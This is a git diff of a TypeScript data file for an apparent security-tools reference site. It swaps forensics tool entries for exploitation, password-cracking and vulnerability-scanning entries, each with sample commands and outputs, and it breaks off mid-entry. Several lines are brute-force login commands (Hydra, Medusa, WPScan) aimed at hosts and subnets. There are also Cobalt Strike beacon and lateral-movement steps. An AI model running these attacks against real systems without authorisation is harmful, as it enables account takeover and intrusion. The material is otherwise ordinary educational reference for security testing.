-      whatItsUsedFor: "Used to identify security vulnerabilities in WordPress sites, including plugin vulnerabilities, theme issues, and configuration problems.",
-      howItWorks: "Performs enumeration and vulnerability detection specific to WordPress installations, checking plugins, themes, users, and core files.",
-      commands: [
-        "wpscan --url https://example.com",
-        "wpscan --url https://example.com --enumerate u",
-        "wpscan --url https://example.com --enumerate p,t,u",
-        "wpscan --url https://example.com --passwords passwords.txt"
-      ],
-      results: [
-        "WordPress version 5.9.3 identified",
-        "Found 3 vulnerable plugins",
-        "Enumerated 5 users",
-        "Identified outdated theme"
-      ],
-      useCases: [
-        "WordPress security assessment",
-        "Plugin vulnerability scanning",
-        "User enumeration",
-        "Brute force testing"
-      ],
-      features: [
-        "WordPress-specific scanning",
-        "Plugin/theme enumeration",
-        "User enumeration",
-        "Brute force capabilities",
-        "Vulnerability database integration"
-      ],
-      installSteps: [
-        "Install Ruby: sudo apt install ruby-dev",
-        "Install WPScan: gem install wpscan",
-        "Update database: wpscan --update",
-        "Test scan: wpscan --url [WordPress_site]"
-      ],
-      basicUsage: [
-        "Basic scan: wpscan --url [URL]",
-        "Enumerate plugins: wpscan --url [URL] --enumerate p",
-        "Enumerate users: wpscan --url [URL] --enumerate u",
-        "Brute force: wpscan --url [URL] --usernames [user] --passwords [list]"
-      ]
-    },
-    {
-      id: "lynis",
-      name: "Lynis",
-      fullName: "Lynis Security Auditing Tool",
-      description: "Security auditing tool for Unix/Linux systems",
-      longDescription: "Lynis is a security auditing tool for Unix/Linux systems. It performs an extensive health scan of your systems to support system hardening and compliance testing.",
-      category: "Vulnerability Scanning",
-      difficulty: "Intermediate",
-      lastUpdated: "2024-01-20",
-      officialSite: "https://cisofy.com/lynis",
-      icon: "🔒",
-      whatItIs: "A comprehensive security auditing tool that performs system hardening and compliance checks on Unix/Linux systems.",
-      whatItsUsedFor: "Used for security auditing, system hardening, penetration testing, and compliance checking of Linux/Unix systems.",
-      howItWorks: "Performs hundreds of individual tests to check system configuration, installed software, and security settings against best practices.",
-      commands: [
-        "sudo lynis audit system",
-        "lynis show profiles",
-        "lynis show tests",
-        "lynis audit system --profile /path/to/profile"
-      ],
-      results: [
-        "Lynis 3.0.8 security audit started",
-        "System scan completed",
-        "Hardening index: 72/100",
-        "Found 15 warnings, 8 suggestions"
-      ],
-      useCases: [
-        "System security auditing",
-        "Compliance checking",
-        "System hardening",
-        "Penetration testing"
-      ],
-      features: [
-        "Comprehensive system scanning",
-        "Compliance framework support",
-        "Custom profiles",
-        "Detailed reporting",
-        "Integration capabilities"
-      ],
-      installSteps: [
-        "Install: sudo apt install lynis",
-        "Update: sudo lynis update info",
-        "Check version: lynis --version",
-        "Run audit: sudo lynis audit system"
-      ],
-      basicUsage: [
-        "Full audit: sudo lynis audit system",
-        "Quick audit: sudo lynis audit system --quick",
-        "Show tests: lynis show tests",
-        "Custom profile: lynis audit system --profile [profile]"
-      ]
-    }
-  ],
-
-  "forensics": [
-    {
-      id: "autopsy",
-      name: "Autopsy",
-      fullName: "Autopsy Digital Forensics Platform",
-      description: "Digital forensics platform and GUI for The Sleuth Kit",
-      longDescription: "Autopsy is a digital forensics platform and graphical interface to The Sleuth Kit and other digital forensics tools. It can be used to investigate what happened on a computer.",
-      category: "Forensics",
-      difficulty: "Intermediate",
-      lastUpdated: "2024-01-25",
-      officialSite: "https://www.autopsy.com",
-      icon: "🔍",
-      whatItIs: "A comprehensive digital forensics platform for investigating digital evidence from computers and mobile devices.",
-      whatItsUsedFor: "Used by digital forensics investigators to analyze disk images, recover deleted files, and investigate cybercrime incidents.",
-      howItWorks: "Provides a graphical interface for examining disk images, file systems, and extracting digital evidence from various storage devices.",
-      commands: [
-        "Launch Autopsy GUI",
-        "Create new case",
-        "Add disk image data source",
-        "Run ingest modules for analysis"
-      ],
-      results: [
-        "Case created successfully",
-        "Disk image loaded: evidence.dd",
-        "Found 1,250 deleted files",
-        "Identified 45 web artifacts"
-      ],
-      useCases: [
-        "Criminal investigations",
-        "Corporate incident response",
-        "Data recovery",
-        "Cybercrime analysis"
-      ],
-      features: [
-        "Graphical user interface",
-        "Timeline analysis",
-        "Keyword searching",
-        "File carving",
-        "Report generation"
-      ],
-      installSteps: [
-        "Download from official website",
-        "Install Java Runtime Environment",
-        "Install Autopsy package",
-        "Launch application and create case"
-      ],
-      basicUsage: [
-        "Launch Autopsy",
-        "Create new case",
-        "Add data source (disk image)",
-        "Configure and run analysis modules"
-      ]
-    },
-    {
-      id: "volatility",
-      name: "Volatility",
-      fullName: "Volatility Memory Forensics Framework",
-      description: "Advanced memory forensics framework for incident response and malware analysis",
-      longDescription: "Volatility is an open source memory forensics framework for incident response and malware analysis. It is written in Python and supports Microsoft Windows, Mac OS X, and Linux.",
-      category: "Forensics",
-      difficulty: "Advanced",
-      lastUpdated: "2024-01-22",
-      officialSite: "https://www.volatilityfoundation.org",
-      icon: "🧠",
-      whatItIs: "A memory forensics framework for analyzing RAM dumps and extracting digital artifacts from memory.",
-      whatItsUsedFor: "Used for malware analysis, incident response, and extracting evidence from computer memory dumps.",
-      howItWorks: "Analyzes memory dumps to reconstruct the system state, identify running processes, network connections, and extract digital artifacts.",
-      commands: [
-        "volatility -f memory.dmp imageinfo",
-        "volatility -f memory.dmp --profile=Win7SP1x64 pslist",
-        "volatility -f memory.dmp --profile=Win7SP1x64 netscan",
-        "volatility -f memory.dmp --profile=Win7SP1x64 malfind"
-      ],
-      results: [
-        "Memory profile identified: Win7SP1x64",
-        "Found 45 running processes",
-        "Detected suspicious process: malware.exe",
-        "Extracted network connections"
-      ],
-      useCases: [
-        "Malware analysis",
-        "Incident response",
-        "Digital forensics",
-        "Security research"
-      ],
-      features: [
-        "Cross-platform support",
-        "Extensive plugin architecture",
-        "Process analysis",
-        "Network artifact extraction",
-        "Malware detection"
-      ],
-      installSteps: [
-        "Install Python 2.7: sudo apt install python2.7",
-        "Clone repository: git clone https://github.com/volatilityfoundation/volatility.git",
-        "Install dependencies: pip install pycrypto distorm3",
-        "Run: python vol.py --help"
-      ],
-      basicUsage: [
-        "Get image info: volatility -f [dump] imageinfo",
-        "List processes: volatility -f [dump] --profile=[profile] pslist",
-        "Network scan: volatility -f [dump] --profile=[profile] netscan",
-        "Find malware: volatility -f [dump] --profile=[profile] malfind"
-      ]
-    },
-    {
-      id: "binwalk",
-      name: "Binwalk",
-      fullName: "Binwalk Firmware Analysis Tool",
-      description: "Tool for analyzing, reverse engineering, and extracting firmware images",
-      longDescription: "Binwalk is a fast, easy to use tool for analyzing, reverse engineering, and extracting firmware images. It is designed specifically to identify files and code embedded inside of firmware images.",
-      category: "Forensics",
+      id: "burpsuite",
+      name: "Burp Suite",
+      fullName: "Burp Suite Professional",
+      description: "Integrated platform for web application security testing",
+      longDescription: "Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application's attack surface, through to finding and exploiting security vulnerabilities.",
+      category: "Exploitation",
       difficulty: "Intermediate",
       lastUpdated: "2024-01-18",
-      officialSite: "https://github.com/ReFirmLabs/binwalk",
-      icon: "🔧",
-      whatItIs: "A firmware analysis tool for identifying and extracting embedded files and code from firmware images.",
-      whatItsUsedFor: "Used for reverse engineering firmware, IoT security research, and extracting embedded files from binary images.",
-      howItWorks: "Uses signature scanning to identify file systems, compressed archives, and executable code within firmware images.",
-      commands: [
-        "binwalk firmware.bin",
-        "binwalk -e firmware.bin",
-        "binwalk -A firmware.bin",
-        "binwalk --entropy firmware.bin"
-      ],
-      results: [
-        "Scanning firmware image...",
-        "Found compressed data at offset 0x1000",
-        "Extracted file system to _firmware.bin.extracted/",
-        "Identified embedded Linux kernel"
-      ],
-      useCases: [
-        "Firmware reverse engineering",
-        "IoT security research",
-        "Malware analysis",
-        "Digital forensics"
-      ],
-      features: [
-        "Signature-based scanning",
-        "Automatic extraction",
-        "Entropy analysis",
-        "Architecture identification",
-        "Plugin support"
-      ],
-      installSteps: [
-        "Install: sudo apt install binwalk",
-        "Install dependencies: sudo apt install python3-pip",
-        "Install additional tools: sudo apt install unrar p7zip-full",
-        "Test: binwalk --help"
-      ],
-      basicUsage: [
-        "Scan file: binwalk [file]",
-        "Extract files: binwalk -e [file]",
-        "Architecture scan: binwalk -A [file]",
-        "Entropy analysis: binwalk --entropy [file]"
-      ]
-    },
-    {
-      id: "foremost",
-      name: "Foremost",
-      fullName: "Foremost File Carving Tool",
-      description: "Console program to recover files based on their headers and footers",
-      longDescription: "Foremost is a console program to recover files based on their headers, footers, and internal data structures. This process is commonly referred to as data carving.",
-      category: "Forensics",
-      difficulty: "Beginner",
-      lastUpdated: "2024-01-16",
-      officialSite: "http://foremost.sourceforge.net",
-      icon: "🗂️",
-      whatItIs: "A file carving tool that recovers files from disk images or raw data based on file signatures.",
-      whatItsUsedFor: "Used for recovering deleted files, extracting files from disk images, and digital forensics investigations.",
-      howItWorks: "Searches for file headers and footers to identify and extract complete files from disk images or raw data streams.",
-      commands: [
-        "foremost -t all -i disk.img",
-        "foremost -t jpg,png -i disk.img -o output/",
-        "foremost -c custom.conf -i disk.img",
-        "foremost -v -t pdf -i disk.img"
-      ],
-      results: [
-        "Processing disk image...",
-        "Recovered 25 JPEG files",
-        "Recovered 10 PDF documents",
-        "Output saved to output/jpg/ and output/pdf/"
-      ],
-      useCases: [
-        "File recovery",
-        "Digital forensics",
-        "Data extraction",
-        "Evidence preservation"
-      ],
-      features: [
-        "Multiple file type support",
-        "Custom configuration",
-        "Bulk file recovery",
-        "Detailed reporting",
-        "Command-line interface"
-      ],
-      installSteps: [
-        "Install: sudo apt install foremost",
-        "Verify installation: foremost -h",
-        "Check config: cat /etc/foremost.conf",
-        "Test recovery: foremost -t jpg -i [image]"
-      ],
-      basicUsage: [
-        "Recover all files: foremost -t all -i [image]",
-        "Specific types: foremost -t [types] -i [image]",
-        "Output directory: foremost -t [types] -i [image] -o [dir]",
-        "Verbose mode: foremost -v -t [types] -i [image]"
-      ]
-    },
-    {
-      id: "sleuthkit",
-      name: "The Sleuth Kit",
-      fullName: "The Sleuth Kit Digital Forensics Tools",
-      description: "Collection of command line digital forensics tools",
-      longDescription: "The Sleuth Kit (TSK) is a library and collection of command line digital forensics tools that allow you to investigate volume and file system data.",
-      category: "Forensics",
-      difficulty: "Advanced",
-      lastUpdated: "2024-01-19",
-      officialSite: "https://www.sleuthkit.org",
-      icon: "🕵️",
-      whatItIs: "A comprehensive collection of command-line tools for digital forensics analysis of file systems and disk images.",
-      whatItsUsedFor: "Used for low-level analysis of file systems, timeline creation, and detailed forensic examination of digital evidence.",
-      howItWorks: "Provides tools to analyze file system structures, recover deleted files, and create detailed timelines of file system activity.",
-      commands: [
-        "mmls disk.img",
-        "fsstat -o 2048 disk.img",
-        "fls -r -o 2048 disk.img",
-        "icat -o 2048 disk.img 12345"
-      ],
-      results: [
-        "Partition table identified",
-        "File system: NTFS, 500GB capacity",
-        "Found 10,000 allocated files",
-        "Recovered deleted file content"
-      ],
-      useCases: [
-        "File system analysis",
-        "Timeline creation",
-        "Deleted file recovery",
-        "Digital forensics investigations"
-      ],
-      features: [
-        "Multiple file system support",
-        "Timeline analysis",
-        "Metadata extraction",
-        "Deleted file recovery",
-        "Command-line tools"
-      ],
-      installSteps: [
-        "Install: sudo apt install sleuthkit",
-        "Verify: tsk_version",
-        "Check tools: ls /usr/bin/*sl*",
-        "Test: mmls /dev/sda"
-      ],
-      basicUsage: [
-        "List partitions: mmls [image]",
-        "File system info: fsstat [image]",
-        "List files: fls -r [image]",
-        "Extract file: icat [image] [inode]"
-      ]
-    },
-    {
-      id: "exiftool",
-      name: "ExifTool",
-      fullName: "ExifTool Metadata Reader/Writer",
-      description: "Platform-independent library and application for reading and writing metadata",
-      longDescription: "ExifTool is a platform-independent Perl library plus a command-line application for reading, writing and editing meta information in a wide variety of files.",
-      category: "Forensics",
-      difficulty: "Beginner",
-      lastUpdated: "2024-01-14",
-      officialSite: "https://exiftool.org",
-      icon: "📸",
-      whatItIs: "A comprehensive metadata extraction tool for analyzing digital files and their embedded information.",
-      whatItsUsedFor: "Used for extracting metadata from digital photos, documents, and other files for forensic analysis and investigation.",
-      howItWorks: "Reads and extracts metadata from various file formats, revealing creation dates, GPS coordinates, camera settings, and other embedded information.",
-      commands: [
-        "exiftool image.jpg",
-        "exiftool -GPS* image.jpg",
-        "exiftool -r -ext jpg /path/to/directory",
-        "exiftool -csv -GPS* *.jpg > gps_data.csv"
-      ],
-      results: [
-        "Camera: Canon EOS 5D Mark IV",
-        "GPS Coordinates: 40.7589, -73.9851",
-        "Creation Date: 2024:01:15 14:30:22",
-        "Software: Adobe Photoshop 2023"
-      ],
-      useCases: [
-        "Digital photo analysis",
-        "Document forensics",
-        "GPS tracking investigation",
-        "Timestamp verification"
-      ],
-      features: [
-        "Wide file format support",
-        "GPS coordinate extraction",
-        "Batch processing",
-        "Metadata editing",
-        "CSV output support"
-      ],
-      installSteps: [
-        "Install: sudo apt install exiftool",
-        "Verify: exiftool -ver",
-        "Test on image: exiftool [image_file]",
-        "Check supported formats: exiftool -listf"
-      ],
-      basicUsage: [
-        "Basic info: exiftool [file]",
-        "GPS data: exiftool -GPS* [file]",
-        "Batch process: exiftool -r [directory]",
-        "CSV output: exiftool -csv [files] > output.csv"
-      ]
-    }
-  ],
-
-  "web-assessment": [
-    {
-      id: "burp-suite-web",
-      name: "Burp Suite",
-      fullName: "Burp Suite Web Application Security Testing Platform",
-      description: "Integrated platform for performing security testing of web applications",
-      longDescription: "Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process.",
-      category: "Web Assessment",
-      difficulty: "Intermediate",
-      lastUpdated: "2024-01-26",
       officialSite: "https://portswigger.net/burp",
       icon: "🔥",
-      whatItIs: "A comprehensive web application security testing platform with proxy, scanner, and manual testing tools.",
-      whatItsUsedFor: "Used by security professionals to test web applications for vulnerabilities, intercept and modify HTTP traffic, and perform comprehensive security assessments.",
-      howItWorks: "Acts as a proxy between browser and web application, allowing interception, modification, and analysis of HTTP/HTTPS traffic for security testing.",
+      whatItIs: "A comprehensive web application security testing platform with integrated tools.",
+      whatItsUsedFor: "Used by web application security testers to identify vulnerabilities, manipulate HTTP traffic, and perform comprehensive security assessments.",
+      howItWorks: "Acts as an intercepting proxy between the browser and web application, allowing security testers to analyze, modify, and replay HTTP requests and responses.",
       commands: [
         "Start Burp Suite application",
-        "Configure browser proxy: 127.0.0.1:8080",
-        "Intercept HTTP requests",
-        "Run automated vulnerability scans"
+        "Configure browser proxy settings",
+        "Intercept and modify HTTP requests",
+        "Run automated scans"
       ],
       results: [
-        "Burp Suite started successfully",
-        "Proxy configured and intercepting traffic",
-        "Found 12 vulnerabilities in target application",
-        "SQL injection identified in login form"
+        "Burp Suite Professional started",
+        "Proxy listening on 127.0.0.1:8080",
+        "45 vulnerabilities found in scan",
+        "SQL injection detected in parameter 'id'"
       ],
       useCases: [
         "Web application penetration testing",
         "API security testing",
         "Manual security testing",
-        "Vulnerability research"
+        "Automated vulnerability scanning"
       ],
       features: [
-        "HTTP/HTTPS proxy",
-        "Automated vulnerability scanning",
-        "Manual testing tools",
-        "Extensibility through plugins",
-        "Session management"
+        "Intercepting proxy",
+        "Web vulnerability scanner",
+        "Application spider",
+        "Intruder tool for attacks",
+        "Extensible platform"
       ],
       installSteps: [
         "Download from PortSwigger website",
@@ -2170,320 +1118,1193 @@ export const toolsData: Record<string, Tool[]> = {
       ],
       basicUsage: [
         "Start Burp Suite",
-        "Configure browser proxy: 127.0.0.1:8080",
+        "Configure proxy in browser",
         "Browse target application",
-        "Analyze intercepted requests in Proxy tab"
+        "Analyze traffic in Burp"
       ]
     },
+    {
+      id: "cobalt-strike",
+      name: "Cobalt Strike",
+      fullName: "Cobalt Strike Adversary Simulation",
+      description: "Commercial adversary simulation and red team operations platform",
+      longDescription: "Cobalt Strike is a commercial penetration testing tool that provides a post-exploitation agent and covert channels to emulate a quiet long-term embedded actor in a customer network.",
+      category: "Exploitation",
+      difficulty: "Advanced",
+      lastUpdated: "2024-01-10",
+      officialSite: "https://www.cobaltstrike.com",
+      icon: "⚔️",
+      whatItIs: "A commercial red team operations and adversary simulation platform.",
+      whatItsUsedFor: "Used by red teams and advanced penetration testers for post-exploitation activities, lateral movement, and simulating advanced persistent threats.",
+      howItWorks: "Provides a framework for post-exploitation with advanced features for maintaining persistence, lateral movement, and covert communication channels.",
+      commands: [
+        "Start team server",
+        "Connect Cobalt Strike client",
+        "Generate payload beacons",
+        "Execute post-exploitation modules"
+      ],
+      results: [
+        "Team server started on port 50050",
+        "Beacon established from target host",
+        "Privilege escalation successful",
+        "Lateral movement to 3 additional hosts"
+      ],
+      useCases: [
+        "Red team operations",
+        "Advanced penetration testing",
+        "APT simulation",
+        "Security training"
+      ],
+      features: [
+        "Advanced payload generation",
+        "Post-exploitation framework",
+        "Covert communication",
+        "Team collaboration",
+        "Malleable C2 profiles"
+      ],
+      installSteps: [
+        "Purchase license from official website",
+        "Download team server and client",
+        "Configure team server",
+        "Connect clients to team server"
+      ],
+      basicUsage: [
+        "Start team server with profile",
+        "Connect client to team server",
+        "Generate and deploy beacons",
+        "Execute post-exploitation tasks"
+      ]
+    }
+  ],
+
+  "password-cracking": [
+    {
+      id: "hashcat",
+      name: "Hashcat",
+      fullName: "Advanced Password Recovery",
+      description: "World's fastest password cracker and recovery utility",
+      longDescription: "Hashcat is the world's fastest and most advanced password recovery utility, supporting five unique modes of attack for over 300 highly-optimized hashing algorithms.",
+      category: "Password Cracking",
+      difficulty: "Intermediate",
+      lastUpdated: "2024-01-14",
+      officialSite: "https://hashcat.net/hashcat/",
+      icon: "🔓",
+      whatItIs: "The fastest and most advanced password recovery tool available.",
+      whatItsUsedFor: "Used by security professionals to test password strength, recover forgotten passwords, and assess authentication security in penetration tests.",
+      howItWorks: "Utilizes GPU acceleration and optimized algorithms to perform various attack types including dictionary, brute-force, and rule-based attacks against password hashes.",
+      commands: [
+        "hashcat -m 0 hashes.txt wordlist.txt",
+        "hashcat -m 1000 ntlm_hashes.txt rockyou.txt",
+        "hashcat -m 22000 wpa_capture.hc22000 wordlist.txt",
+        "hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a"
+      ],
+      results: [
+        "Cracking speed: 15.2 GH/s",
+        "Password cracked: 'admin123'",
+        "Session restored from checkpoint",
+        "Hash type: MD5 detected automatically"
+      ],
+      useCases: [
+        "Password security testing",
+        "Digital forensics investigations",
+        "Security audits",
+        "Password recovery"
+      ],
+      features: [
+        "GPU acceleration support",
+        "300+ hash algorithm support",
+        "Multiple attack modes",
+        "Distributed cracking",
+        "Real-time performance monitoring"
+      ],
+      installSteps: [
+        "Download from official website",
+        "Extract archive: tar -xzf hashcat-6.x.x.tar.gz",
+        "Install OpenCL drivers for GPU",
+        "Test: ./hashcat --version"
+      ],
+      basicUsage: [
+        "Dictionary attack: hashcat -m [hash_type] [hash_file] [wordlist]",
+        "Brute force: hashcat -a 3 -m [hash_type] [hash_file] [mask]",
+        "Show cracked: hashcat --show [hash_file]",
+        "Benchmark: hashcat -b"
+      ]
+    },
+    {
+      id: "john",
+      name: "John the Ripper",
+      fullName: "John the Ripper Password Cracker",
+      description: "Fast password cracker with support for many hash types",
+      longDescription: "John the Ripper is a fast password cracker, currently available for many flavors of Unix, macOS, Windows, DOS, BeOS, and OpenVMS. Its primary purpose is to detect weak Unix passwords.",
+      category: "Password Cracking",
+      difficulty: "Beginner",
+      lastUpdated: "2024-01-12",
+      officialSite: "https://www.openwall.com/john/",
+      icon: "🗡️",
+      whatItIs: "A classic and versatile password cracking tool with extensive hash format support.",
+      whatItsUsedFor: "Used for password auditing, security testing, and recovering passwords from various hash formats in penetration testing scenarios.",
+      howItWorks: "Employs multiple attack methods including dictionary attacks, incremental attacks, and external modes to crack passwords efficiently.",
+      commands: [
+        "john --wordlist=rockyou.txt hashes.txt",
+        "john --incremental hashes.txt",
+        "john --show hashes.txt",
+        "john --format=NT ntlm_hashes.txt"
+      ],
+      results: [
+        "Loaded 1500 password hashes",
+        "Password cracked: user1:password123",
+        "Session completed in 4m 32s",
+        "Remaining 47 hashes uncracked"
+      ],
+      useCases: [
+        "System password auditing",
+        "Hash cracking challenges",
+        "Security assessments",
+        "Digital forensics"
+      ],
+      features: [
+        "Multiple hash format support",
+        "Incremental brute force",
+        "Custom rules engine",
+        "Distributed computing support",
+        "Session management"
+      ],
+      installSteps: [
+        "Install via package manager: sudo apt install john",
+        "Or compile from source: make clean && make",
+        "Download wordlists (rockyou, etc.)",
+        "Test: john --test"
+      ],
+      basicUsage: [
+        "Dictionary: john --wordlist=[wordlist] [hashfile]",
+        "Incremental: john --incremental [hashfile]",
+        "Show results: john --show [hashfile]",
+        "Specific format: john --format=[type] [hashfile]"
+      ]
+    },
+    {
+      id: "hydra",
+      name: "Hydra",
+      fullName: "THC Hydra Password Cracker",
+      description: "Fast network logon cracker supporting numerous protocols",
+      longDescription: "Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.",
+      category: "Password Cracking",
+      difficulty: "Intermediate",
+      lastUpdated: "2024-01-09",
+      officialSite: "https://github.com/vanhauser-thc/thc-hydra",
+      icon: "🐍",
+      whatItIs: "A fast network authentication cracker that supports many different services.",
+      whatItsUsedFor: "Used to test the strength of passwords on network services like SSH, FTP, HTTP, and many others during security assessments.",
+      howItWorks: "Performs brute force and dictionary attacks against network authentication protocols by trying multiple username/password combinations in parallel.",
+      commands: [
+        "hydra -l admin -P passwords.txt ssh://192.168.1.100",
+        "hydra -L users.txt -P passwords.txt ftp://target.com",
+        "hydra -l admin -p admin http-get://target.com/admin",
+        "hydra -C combo.txt ssh://192.168.1.100"
+      ],
+      results: [
+        "Hydra v9.1 starting at 2024-01-15 10:30:25",
+        "[SSH] host: 192.168.1.100 login: admin password: admin123",
+        "1 of 1 target successfully completed",
+        "Attack completed in 2m 15s"
+      ],
+      useCases: [
+        "Network service authentication testing",
+        "Web application login testing",
+        "Remote service security auditing",
+        "Password policy validation"
+      ],
+      features: [
+        "50+ protocol support",
+        "Parallel attack execution",
+        "Flexible input options",
+        "Resume capability",
+        "Proxy support"
+      ],
+      installSteps: [
+        "Install via package manager: sudo apt install hydra",
+        "Or compile from source: ./configure && make && make install",
+        "Verify installation: hydra -h",
+        "Download wordlists for testing"
+      ],
+      basicUsage: [
+        "SSH brute force: hydra -l [user] -P [passlist] ssh://[target]",
+        "HTTP form: hydra -l [user] -P [passlist] [target] http-post-form",
+        "FTP attack: hydra -L [userlist] -P [passlist] ftp://[target]",
+        "Show help: hydra -h"
+      ]
+    },
+    {
+      id: "cewl",
+      name: "CeWL",
+      fullName: "Custom Word List Generator",
+      description: "Custom wordlist generator that spiders websites",
+      longDescription: "CeWL is a ruby app which spiders a given URL to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.",
+      category: "Password Cracking",
+      difficulty: "Beginner",
+      lastUpdated: "2024-01-07",
+      officialSite: "https://github.com/digininja/CeWL",
+      icon: "🕸️",
+      whatItIs: "A custom wordlist generator that creates dictionaries from website content.",
+      whatItsUsedFor: "Used to generate targeted wordlists for password attacks based on the target organization's website content and terminology.",
+      howItWorks: "Crawls websites to extract words, which are then used to create custom dictionaries that are more likely to contain passwords used by the organization.",
+      commands: [
+        "cewl -d 2 -m 5 https://example.com",
+        "cewl -w wordlist.txt https://example.com",
+        "cewl -e --email_file emails.txt https://example.com",
+        "cewl -a --meta_file meta.txt https://example.com"
+      ],
+      results: [
+        "Found 247 words from target website",
+        "Generated wordlist saved to wordlist.txt",
+        "Extracted 12 email addresses",
+        "Metadata analysis completed"
+      ],
+      useCases: [
+        "Custom wordlist generation",
+        "Targeted password attacks",
+        "OSINT information gathering",
+        "Social engineering preparation"
+      ],
+      features: [
+        "Website crawling",
+        "Custom word extraction",
+        "Email address harvesting",
+        "Metadata analysis",
+        "Configurable depth and filtering"
+      ],
+      installSteps: [
+        "Install Ruby: sudo apt install ruby",
+        "Clone repository: git clone https://github.com/digininja/CeWL.git",
+        "Install gems: gem install mini_exiftool spider nokogiri",
+        "Make executable: chmod +x cewl.rb"
+      ],
+      basicUsage: [
+        "Basic crawl: cewl [URL]",
+        "Save wordlist: cewl -w output.txt [URL]",
+        "Set depth: cewl -d [depth] [URL]",
+        "Minimum word length: cewl -m [length] [URL]"
+      ]
+    },
+    {
+      id: "medusa",
+      name: "Medusa",
+      fullName: "Medusa Parallel Password Cracker",
+      description: "Speedy, parallel, and modular login brute-forcer",
+      longDescription: "Medusa is intended to be a speedy, massively parallel, modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible.",
+      category: "Password Cracking",
+      difficulty: "Intermediate",
+      lastUpdated: "2024-01-11",
+      officialSite: "http://foofus.net/goons/jmk/medusa/medusa.html",
+      icon: "🐙",
+      whatItIs: "A fast, parallel network authentication brute-forcing tool.",
+      whatItsUsedFor: "Used for testing authentication security across multiple network services simultaneously with high-speed parallel processing.",
+      howItWorks: "Performs massively parallel brute force attacks against network authentication services using modular design for different protocols.",
+      commands: [
+        "medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh",
+        "medusa -H hosts.txt -U users.txt -P passwords.txt -M ftp",
+        "medusa -h target.com -u admin -p admin -M http -m DIR:/admin",
+        "medusa -h 192.168.1.0/24 -u admin -p admin -M ssh"
+      ],
+      results: [
+        "Medusa v2.2 starting at 2024-01-15 14:20:35",
+        "ACCOUNT FOUND: [ssh] Host: 192.168.1.100 User: admin Password: admin123",
+        "Attack completed successfully",
+        "1 valid account found in 3m 45s"
+      ],
+      useCases: [
+        "Network authentication testing",
+        "Large-scale password auditing",
+        "Service security validation",
+        "Penetration testing"
+      ],
+      features: [
+        "Massively parallel execution",
+        "Multiple protocol modules",
+        "Flexible target specification",
+        "Resume capability",
+        "Detailed logging"
+      ],
+      installSteps: [
+        "Install via package manager: sudo apt install medusa",
+        "Or compile from source: ./configure && make && make install",
+        "Check available modules: medusa -d",
+        "Test installation: medusa -h"
+      ],
+      basicUsage: [
+        "Single target: medusa -h [host] -u [user] -P [passlist] -M [module]",
+        "Multiple hosts: medusa -H [hostlist] -u [user] -P [passlist] -M [module]",
+        "User/pass combo: medusa -h [host] -C [combo_file] -M [module]",
+        "List modules: medusa -d"
+      ]
+    }
+  ],
+
+  "vulnerability-scanning": [
+    {
+      id: "nessus",
+      name: "Nessus",
+      fullName: "Nessus Vulnerability Scanner",
+      description: "Comprehensive vulnerability assessment scanner",
+      longDescription: "Nessus is a proprietary vulnerability scanner developed by Tenable, Inc. It is free of charge for personal use in a non-enterprise environment.",
+      category: "Vulnerability Scanning",
+      difficulty: "Intermediate",
+      lastUpdated: "2024-01-20",
+      officialSite: "https://www.tenable.com/products/nessus",
+      icon: "🛡️",
+      whatItIs: "A comprehensive vulnerability scanner for identifying security weaknesses in networks and systems.",
+      whatItsUsedFor: "Used by security professionals to identify vulnerabilities, misconfigurations, and compliance issues across enterprise networks and cloud environments.",
+      howItWorks: "Performs authenticated and unauthenticated scans using a vast database of vulnerability checks to identify security issues and provide remediation guidance.",
+      commands: [
+        "Access web interface at https://localhost:8834",
+        "Create new scan policy",
+        "Configure target hosts and credentials",
+        "Launch vulnerability scan"
+      ],
+      results: [
+        "Scan completed: 25 hosts scanned",
+        "Found 47 vulnerabilities (12 critical, 15 high)",
+        "Generated compliance report",
+        "Exported results to PDF/CSV"
+      ],
+      useCases: [
+        "Enterprise vulnerability management",
+        "Compliance auditing",
+        "Risk assessment",
+        "Security monitoring"
+      ],
+      features: [
+        "Extensive vulnerability database",
+        "Authenticated scanning",
+        "Compliance templates",
+        "Web-based interface",
+        "Detailed reporting"
+      ],
+      installSteps: [
+        "Download from Tenable website",
+        "Install package: sudo dpkg -i Nessus-*.deb",
+        "Start service: sudo systemctl start nessusd",
+        "Access web UI: https://localhost:8834"
+      ],
+      basicUsage: [
+        "Access web interface",
+        "Create scan policy",
+        "Add target hosts",
+        "Review and export results"
+      ]
+    },
+    {
+      id: "openvas",
+      name: "OpenVAS",
+      fullName: "Open Vulnerability Assessment Scanner",
+      description: "Open source vulnerability scanner and management solution",
+      longDescription: "OpenVAS is a framework of several services and tools offering a comprehensive and powerful vulnerability scanning and vulnerability management solution.",
+      category: "Vulnerability Scanning",
+      difficulty: "Advanced",
+      lastUpdated: "2024-01-18",
+      officialSite: "https://openvas.org",
+      icon: "🔍",
+      whatItIs: "An open-source vulnerability scanner providing comprehensive security testing capabilities.",
+      whatItsUsedFor: "Used for vulnerability assessment, security auditing, and compliance checking in enterprise environments as a cost-effective alternative to commercial scanners.",
+      howItWorks: "Uses a collection of Network Vulnerability Tests (NVTs) to scan systems for known vulnerabilities and security issues, providing detailed reports and remediation advice.",
+      commands: [
+        "gvm-setup",
+        "gvm-start",
+        "gvm-check-setup",
+        "Access web interface at https://localhost:9392"
+      ],
+      results: [
+        "OpenVAS setup completed successfully",
+        "Feed synchronization finished",
+        "Scan completed: 15 vulnerabilities found",
+        "Generated detailed security report"
+      ],
+      useCases: [
+        "Network vulnerability assessment",
+        "Security compliance auditing",
+        "Continuous security monitoring",
+        "Risk management"
+      ],
+      features: [
+        "Comprehensive NVT feed",
+        "Web-based management interface",
+        "Automated scanning schedules",
+        "Custom report generation",
+        "Multi-user support"
+      ],
+      installSteps: [
+        "Install via package manager or build from source",
+        "Run setup: sudo gvm-setup",
+        "Start services: sudo gvm-start",
+        "Access web UI: https://localhost:9392"
+      ],
+      basicUsage: [
+        "Setup: gvm-setup",
+        "Start services: gvm-start",
+        "Access web interface",
+        "Create and run scans"
+      ]
+    },
+    {
+      id: "nikto",
+      name: "Nikto",
+      fullName: "Nikto Web Server Scanner",
